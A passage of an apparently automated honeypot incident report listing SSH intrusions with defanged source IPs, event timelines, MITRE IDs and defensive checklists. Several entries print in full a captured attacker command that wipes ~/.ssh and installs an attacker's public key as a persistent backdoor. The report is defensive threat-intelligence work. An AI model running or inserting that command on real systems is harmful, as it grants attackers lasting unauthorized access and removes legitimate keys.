| `2026-08-30 03:31:37` | `cowrie.command.failed` |
| `2026-08-30 03:31:37` | `cowrie.log.closed` |
| `2026-08-30 03:31:38` | `cowrie.session.params` |
| `2026-08-30 03:31:38` | `cowrie.command.input` |
| `2026-08-30 03:31:38` | `cowrie.session.file_download` |
| `2026-08-30 03:31:38` | `cowrie.log.closed` |
| `2026-08-30 03:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.73[.]11` to AbuseIPDB if not already reported
- [ ] Block `156.236.73[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe3657cc3ff

| Field | Detail |
|---|---|
| **Source IP** | `156.236.73[.]11` |
| **First Seen** | 2026-08-30 03:31 |
| **Last Seen** | 2026-08-30 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:31:38` | `cowrie.session.connect` |
| `2026-08-30 03:31:38` | `cowrie.client.version` |
| `2026-08-30 03:31:38` | `cowrie.client.kex` |
| `2026-08-30 03:31:39` | `cowrie.login.success` |
| `2026-08-30 03:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.73[.]11` to AbuseIPDB if not already reported
- [ ] Block `156.236.73[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b704574b86ff

| Field | Detail |
|---|---|
| **Source IP** | `156.236.73[.]11` |
| **First Seen** | 2026-08-30 03:31 |
| **Last Seen** | 2026-08-30 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:31:39` | `cowrie.session.connect` |
| `2026-08-30 03:31:39` | `cowrie.client.version` |
| `2026-08-30 03:31:39` | `cowrie.client.kex` |
| `2026-08-30 03:31:40` | `cowrie.login.success` |
| `2026-08-30 03:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.73[.]11` to AbuseIPDB if not already reported
- [ ] Block `156.236.73[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc9ef2a09b63

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:36 |
| **Last Seen** | 2026-08-30 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:36:13` | `cowrie.session.connect` |
| `2026-08-30 03:36:13` | `cowrie.client.version` |
| `2026-08-30 03:36:13` | `cowrie.client.kex` |
| `2026-08-30 03:36:14` | `cowrie.login.success` |
| `2026-08-30 03:36:14` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:36:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:36:15` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99996ae100b4

| Field | Detail |
|---|---|
| **Source IP** | `220.246.42[.]227` |
| **First Seen** | 2026-08-30 03:37 |
| **Last Seen** | 2026-08-30 03:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:37:21` | `cowrie.session.connect` |
| `2026-08-30 03:37:22` | `cowrie.client.version` |
| `2026-08-30 03:37:22` | `cowrie.client.kex` |
| `2026-08-30 03:37:24` | `cowrie.login.success` |
| `2026-08-30 03:37:25` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `220.246.42[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395f2404be6f

| Field | Detail |
|---|---|
| **Source IP** | `219.143.40[.]210` |
| **First Seen** | 2026-08-30 03:37 |
| **Last Seen** | 2026-08-30 03:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:37:30` | `cowrie.session.connect` |
| `2026-08-30 03:37:32` | `cowrie.client.version` |
| `2026-08-30 03:37:32` | `cowrie.client.kex` |
| `2026-08-30 03:37:34` | `cowrie.login.success` |
| `2026-08-30 03:37:35` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.143.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `219.143.40[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc2acb4d5add

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:38 |
| **Last Seen** | 2026-08-30 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:38:15` | `cowrie.session.connect` |
| `2026-08-30 03:38:15` | `cowrie.client.version` |
| `2026-08-30 03:38:16` | `cowrie.client.kex` |
| `2026-08-30 03:38:16` | `cowrie.login.success` |
| `2026-08-30 03:38:17` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:38:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:38:17` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ec2134ebbf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:47 |
| **Last Seen** | 2026-08-30 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:47:07` | `cowrie.session.connect` |
| `2026-08-30 03:47:07` | `cowrie.client.version` |
| `2026-08-30 03:47:07` | `cowrie.client.kex` |
| `2026-08-30 03:47:08` | `cowrie.login.success` |
| `2026-08-30 03:47:08` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:47:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:47:08` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-028dc904b934

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 03:47 |
| **Last Seen** | 2026-08-30 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:47:54` | `cowrie.session.connect` |
| `2026-08-30 03:47:54` | `cowrie.client.version` |
| `2026-08-30 03:47:55` | `cowrie.client.kex` |
| `2026-08-30 03:47:55` | `cowrie.login.success` |
| `2026-08-30 03:47:56` | `cowrie.direct-tcpip.request` |
| `2026-08-30 03:47:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 03:47:56` | `cowrie.direct-tcpip.data` |
| `2026-08-30 03:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea48a5f28daa

| Field | Detail |
|---|---|
| **Source IP** | `52.233.193[.]61` |
| **First Seen** | 2026-08-30 03:48 |
| **Last Seen** | 2026-08-30 03:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:48:50` | `cowrie.session.connect` |
| `2026-08-30 03:48:50` | `cowrie.client.version` |
| `2026-08-30 03:48:50` | `cowrie.client.kex` |
| `2026-08-30 03:48:51` | `cowrie.login.success` |
| `2026-08-30 03:48:51` | `cowrie.session.params` |
| `2026-08-30 03:48:51` | `cowrie.command.input` |
| `2026-08-30 03:48:51` | `cowrie.command.failed` |
| `2026-08-30 03:48:52` | `cowrie.log.closed` |
| `2026-08-30 03:48:52` | `cowrie.session.params` |
| `2026-08-30 03:48:52` | `cowrie.command.input` |
| `2026-08-30 03:48:52` | `cowrie.session.file_download` |
| `2026-08-30 03:48:52` | `cowrie.log.closed` |
| `2026-08-30 03:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.233.193[.]61` to AbuseIPDB if not already reported
- [ ] Block `52.233.193[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a46b7ea565

| Field | Detail |
|---|---|
| **Source IP** | `52.233.193[.]61` |
| **First Seen** | 2026-08-30 03:48 |
| **Last Seen** | 2026-08-30 03:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:48:53` | `cowrie.session.connect` |
| `2026-08-30 03:48:53` | `cowrie.client.version` |
| `2026-08-30 03:48:53` | `cowrie.client.kex` |
| `2026-08-30 03:48:53` | `cowrie.login.success` |
| `2026-08-30 03:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.233.193[.]61` to AbuseIPDB if not already reported
- [ ] Block `52.233.193[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-676b0c6f82ce

| Field | Detail |
|---|---|
| **Source IP** | `52.233.193[.]61` |
| **First Seen** | 2026-08-30 03:48 |
| **Last Seen** | 2026-08-30 03:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:48:53` | `cowrie.session.connect` |
| `2026-08-30 03:48:53` | `cowrie.client.version` |
| `2026-08-30 03:48:53` | `cowrie.client.kex` |
| `2026-08-30 03:48:54` | `cowrie.login.success` |
| `2026-08-30 03:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.233.193[.]61` to AbuseIPDB if not already reported
- [ ] Block `52.233.193[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1fa2b0d7a6

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-08-30 03:49 |
| **Last Seen** | 2026-08-30 03:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:49:49` | `cowrie.session.connect` |
| `2026-08-30 03:49:49` | `cowrie.client.version` |
| `2026-08-30 03:49:49` | `cowrie.client.kex` |
| `2026-08-30 03:49:50` | `cowrie.login.success` |
| `2026-08-30 03:49:51` | `cowrie.session.params` |
| `2026-08-30 03:49:51` | `cowrie.command.input` |
| `2026-08-30 03:49:51` | `cowrie.command.failed` |
| `2026-08-30 03:49:52` | `cowrie.log.closed` |
| `2026-08-30 03:49:53` | `cowrie.session.params` |
| `2026-08-30 03:49:53` | `cowrie.command.input` |
| `2026-08-30 03:49:53` | `cowrie.session.file_download` |
| `2026-08-30 03:49:53` | `cowrie.log.closed` |
| `2026-08-30 03:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a7fe52fadf

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-08-30 03:49 |
| **Last Seen** | 2026-08-30 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:49:53` | `cowrie.session.connect` |
| `2026-08-30 03:49:53` | `cowrie.client.version` |
| `2026-08-30 03:49:53` | `cowrie.client.kex` |
| `2026-08-30 03:49:55` | `cowrie.login.success` |
| `2026-08-30 03:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7640188432d

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-08-30 03:49 |
| **Last Seen** | 2026-08-30 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:49:55` | `cowrie.session.connect` |
| `2026-08-30 03:49:55` | `cowrie.client.version` |
| `2026-08-30 03:49:55` | `cowrie.client.kex` |
| `2026-08-30 03:49:57` | `cowrie.login.success` |
| `2026-08-30 03:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfb7c646b52

| Field | Detail |
|---|---|
| **Source IP** | `94.132.0[.]254` |
| **First Seen** | 2026-08-30 03:49 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:49:57` | `cowrie.session.connect` |
| `2026-08-30 03:49:57` | `cowrie.client.version` |
| `2026-08-30 03:49:57` | `cowrie.client.kex` |
| `2026-08-30 03:49:58` | `cowrie.login.success` |
| `2026-08-30 03:49:59` | `cowrie.session.params` |
| `2026-08-30 03:49:59` | `cowrie.command.input` |
| `2026-08-30 03:49:59` | `cowrie.command.failed` |
| `2026-08-30 03:49:59` | `cowrie.log.closed` |
| `2026-08-30 03:50:00` | `cowrie.session.params` |
| `2026-08-30 03:50:00` | `cowrie.command.input` |
| `2026-08-30 03:50:00` | `cowrie.session.file_download` |
| `2026-08-30 03:50:00` | `cowrie.log.closed` |
| `2026-08-30 03:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.132.0[.]254` to AbuseIPDB if not already reported
- [ ] Block `94.132.0[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c77d72890b

| Field | Detail |
|---|---|
| **Source IP** | `94.132.0[.]254` |
| **First Seen** | 2026-08-30 03:50 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:50:00` | `cowrie.session.connect` |
| `2026-08-30 03:50:00` | `cowrie.client.version` |
| `2026-08-30 03:50:00` | `cowrie.client.kex` |
| `2026-08-30 03:50:00` | `cowrie.login.success` |
| `2026-08-30 03:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.132.0[.]254` to AbuseIPDB if not already reported
- [ ] Block `94.132.0[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0695c136fdfd

| Field | Detail |
|---|---|
| **Source IP** | `94.132.0[.]254` |
| **First Seen** | 2026-08-30 03:50 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:50:01` | `cowrie.session.connect` |
| `2026-08-30 03:50:01` | `cowrie.client.version` |
| `2026-08-30 03:50:01` | `cowrie.client.kex` |
| `2026-08-30 03:50:01` | `cowrie.login.success` |
| `2026-08-30 03:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.132.0[.]254` to AbuseIPDB if not already reported
- [ ] Block `94.132.0[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8eee9f65f43

| Field | Detail |
|---|---|
| **Source IP** | `121.31.210[.]125` |
| **First Seen** | 2026-08-30 03:50 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:50:25` | `cowrie.session.connect` |
| `2026-08-30 03:50:25` | `cowrie.client.version` |
| `2026-08-30 03:50:25` | `cowrie.client.kex` |
| `2026-08-30 03:50:26` | `cowrie.login.success` |
| `2026-08-30 03:50:27` | `cowrie.session.params` |
| `2026-08-30 03:50:27` | `cowrie.command.input` |
| `2026-08-30 03:50:27` | `cowrie.command.failed` |
| `2026-08-30 03:50:28` | `cowrie.log.closed` |
| `2026-08-30 03:50:29` | `cowrie.session.params` |
| `2026-08-30 03:50:29` | `cowrie.command.input` |
| `2026-08-30 03:50:29` | `cowrie.session.file_download` |
| `2026-08-30 03:50:29` | `cowrie.log.closed` |
| `2026-08-30 03:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.31.210[.]125` to AbuseIPDB if not already reported
- [ ] Block `121.31.210[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdcd4918c347

| Field | Detail |
|---|---|
| **Source IP** | `121.31.210[.]125` |
| **First Seen** | 2026-08-30 03:50 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:50:29` | `cowrie.session.connect` |
| `2026-08-30 03:50:29` | `cowrie.client.version` |
| `2026-08-30 03:50:30` | `cowrie.client.kex` |
| `2026-08-30 03:50:31` | `cowrie.login.success` |
| `2026-08-30 03:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.31.210[.]125` to AbuseIPDB if not already reported
- [ ] Block `121.31.210[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7217be5a4abd

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]58` |
| **First Seen** | 2026-08-30 03:50 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:50:33` | `cowrie.session.connect` |
| `2026-08-30 03:50:33` | `cowrie.client.version` |
| `2026-08-30 03:50:34` | `cowrie.client.kex` |
| `2026-08-30 03:50:34` | `cowrie.login.success` |
| `2026-08-30 03:50:35` | `cowrie.session.params` |
| `2026-08-30 03:50:35` | `cowrie.command.input` |
| `2026-08-30 03:50:35` | `cowrie.command.failed` |
| `2026-08-30 03:50:36` | `cowrie.log.closed` |
| `2026-08-30 03:50:37` | `cowrie.session.params` |
| `2026-08-30 03:50:37` | `cowrie.command.input` |
| `2026-08-30 03:50:37` | `cowrie.session.file_download` |
| `2026-08-30 03:50:37` | `cowrie.log.closed` |
| `2026-08-30 03:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e6e6c2d256

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]58` |
| **First Seen** | 2026-08-30 03:50 |
| **Last Seen** | 2026-08-30 03:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 03:50:37` | `cowrie.session.connect` |
| `2026-08-30 03:50:37` | `cowrie.client.version` |
